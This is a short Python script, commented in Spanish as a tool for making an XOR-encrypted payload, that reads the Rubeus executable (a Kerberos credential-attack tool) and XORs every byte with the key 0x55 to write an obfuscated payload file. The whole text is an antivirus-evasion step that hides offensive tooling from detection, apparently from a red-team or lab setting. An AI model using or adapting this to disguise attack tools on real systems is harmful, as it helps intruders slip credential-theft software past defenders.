# Script para crear un payload XOR-encriptado

key = 0x55
with open("rubeus.exe", "rb") as f:
    data = f.read()

xored = bytes([b ^ key for b in data])

with open("payload_xored.bin", "wb") as f:
    f.write(xored)
